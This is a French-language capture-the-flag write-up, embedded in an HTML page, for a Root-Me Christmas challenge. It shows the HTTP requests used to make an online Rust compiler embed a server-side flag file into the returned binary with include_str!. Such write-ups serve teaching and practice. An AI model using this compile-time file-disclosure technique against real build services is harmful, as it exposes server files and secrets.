<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="index, follow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>XMAS root-me challenges, Build And Drustroy</title>
        <meta name="description" content="">
        <meta name="keywords" content="ctf, security, root-me, xmas, MISC, build and drustroy, write-up">
        <meta name="author" content="Antoine Benevaut">

        <meta property="og:type" content="website">
        <meta property="og:url" content="https://www.abenevaut.dev/2024-xmas-root-me/04-misc-build-and-drustroy-1.html">
        <meta property="og:title" content="XMAS root-me challenges, Build And Drustroy">
        <meta property="og:description" content="">
        <meta property="og:image" content="https://www.abenevaut.dev/images/abenevaut-og-xms-2024-root-me.webp">

        <meta property="twitter:card" content="summary_large_image">
        <meta name=”twitter:creator” content=”@abenevaut”>
        <meta property="twitter:url" content="https://www.abenevaut.dev/2024-xmas-root-me/04-misc-build-and-drustroy-1.html">
        <meta property="twitter:title" content="XMAS root-me challenges, Build And Drustroy">
        <meta property="twitter:description" content="">
        <meta property="twitter:image" content="https://www.abenevaut.dev/images/abenevaut-og-xms-2024-root-me.webp">
        <meta property="twitter:image:alt" content="">

        <base href="/"> <!-- dev.abenevaut/abenevaut/dist/ -->

            <link rel="canonical" href="//index.html" />
    <script>
      window.article = '""'
      window.writeup = "<a href=\"#write-up-build-and-drustroy\"><h1 id='write-up-build-and-drustroy'>Write-up Build And Drustroy<\/h1><\/a>\n<p>Challenge du jour, abuser un compilateur de code rust en ligne.\nVia une requ\u00eate HTTP, on envoie un objet JSON qui repr\u00e9sente nos fichiers rust \u00e0 compiler et on r\u00e9cup\u00e8re en t\u00e9l\u00e9chargement le binaire compil\u00e9.\nCi-dessous l'exemple de l'\u00e9nonc\u00e9:<\/p>\n<pre><code class=\"language-bash\">curl -sSk -X POST -H 'Content-Type: application\/json' https:\/\/day4.challenges.xmas.root-me.org\/remote-build -d '{&quot;src\/main.rs&quot;:&quot;fn main() { println!(\\&quot;Hello, world!\\&quot;); }&quot;}' --output binary\nfile binary # binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...\n<\/code><\/pre>\n<p>La premi\u00e8re id\u00e9e d'exploit qui me traverse l'esprit est de compiler un programme qui lirait le flag dans un fichier et l'enverrait \u00e0 un serveur distant.\nL'id\u00e9e est confirm\u00e9 \u00e0 la lecture du code, le docker-compose monte un volume qui contient le flag :<\/p>\n<pre><code class=\"language-yaml\">volumes:\n  - .\/flag.txt:\/flag\/randomflaglolilolbigbisous.txt\n<\/code><\/pre>\n<p>On se lance et on d\u00e9couvre rust pour ce challenge. Il y a plusieurs fa\u00e7ons d'inclure un fichier texte dans un programme rust.\nL'objectif pour nous est de l'inclure avec son contenu au moment de la compilation et pas d'inclure son chemin pour ensuite faire sa lecture,\ncar on ex\u00e9cutera le binaire sur notre machine, le fichier n'existera donc pas.<\/p>\n<p>Toujours avec l'outil ijhttp pour faire les requ\u00eates, on trouvera les binaires t\u00e9l\u00e9charg\u00e9s dans le repertoire <code>.idea\\httpRequests<\/code>\nsi vous utilisez les IDE de JetBrains.<\/p>\n<pre><code>POST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n# binary saved in .idea\\httpRequests\n\n{&quot;src\/main.rs&quot;:&quot;fn main() { println!(\\&quot;Hello, world!\\&quot;); }&quot;}\n\n###\n\nPOST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n{\n  &quot;src\/main.rs&quot;: &quot;include!(\\&quot;\/tmp\/flag.txt\\&quot;); fn main() { println!(\\&quot;Hello, world!\\&quot;); }&quot;\n}\n\n###\n\nPOST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n{\n  &quot;src\/main.rs&quot;: &quot;#[path = \\&quot;\/tmp\/flag.txt\\&quot;] mod flag; fn main() { println!(\\&quot;Hello, world!\\&quot;); }&quot;\n}\n\n###\n\nPOST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n{\n  &quot;src\/main.rs&quot;: &quot;pub mod flag; fn main() { println!(\\&quot;Hello, world!\\&quot;); }&quot;\n}\n\n###\n\n\nPOST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n{\n  &quot;src\/main.rs&quot;: &quot;fn main() { println!(\\&quot;Hello, world!\\&quot;); }&quot;,\n  &quot;\/tmp\/flag.txt&quot;: &quot;flag&quot;\n}\n\n###\n\nPOST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n{\n  &quot;src\/main.rs&quot;: &quot;fn main() { let bytes = include_str!(\\&quot;\/tmp\/flag.txt\\&quot;); print!(\\&quot;{bytes}\\&quot;); }&quot;\n}\n<\/code><\/pre>\n<p>Je finirai enfin une bonne syntaxe pour inclure le contenu du fichier dans le binaire compil\u00e9.\nMerci stackoverflow.<\/p>\n<pre><code>POST https:\/\/day4.challenges.xmas.root-me.org\/remote-build\nContent-Type: application\/json\n\n{\n  &quot;src\/main.rs&quot;: &quot;fn main() { static LONG_STRING: &amp;'static str = include_str!(\\&quot;\/tmp\/flag.txt\\&quot;);println!(\\&quot;{}\\&quot;, LONG_STRING); }&quot;\n}\n<\/code><\/pre>\n<p>\ud83c\udf81On envoie notre requ\u00eate et on obtient le flag \ud83c\udfc1:<\/p>\n<pre><code>[79, 102, 102, 101, 110, 83, 107, 105, 108, 108, 83, 97, 121, ... ]\n<\/code><\/pre>\n<p>Le travail n'est pas fini, avec ce bout de code, on exfiltre le flag en valeur num\u00e9rique ASCII, il faut le convertir en cha\u00eene de caract\u00e8res.<\/p>\n<p>Cr\u00e9dits du challenge <a href=\"https:\/\/x.com\/rootme_org\/status\/1863296339183796546\">root-me.org<\/a> et son auteur Laluka<\/p>\n<p><a href=\"2024-xmas-root-me.html\">Sommaire &gt;<\/a> - <a href=\"2024-xmas-root-me\/05-ai-the-friendly-snowman-1.html\">Challenge suivant &gt;<\/a><\/p>\n"
    </script>
    <script type="module" src="assets/Writeup.js"></script>

        <link rel="preconnect" href="https://fonts.bunny.net">
        <link rel="stylesheet" href="assets/app.css">
        <link rel="shortcut icon" href="assets/app-icon.webp" type="image/webp">
    </head>
    <body class="font-sans antialiased">
        <div id="root"></div>
    </body>
</html>
